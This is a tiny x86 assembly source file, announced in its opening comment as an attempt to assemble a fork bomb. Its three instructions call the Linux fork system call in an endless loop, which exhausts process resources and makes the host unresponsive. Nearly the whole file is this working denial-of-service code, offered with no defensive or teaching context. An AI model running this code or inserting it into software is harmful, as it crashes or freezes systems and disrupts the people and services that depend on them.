; Let's see if we can assemble a forkbomb...


;segment .text
;global _start
_start:
	mov eax, 2;
	int 0x80;
	jmp _start;
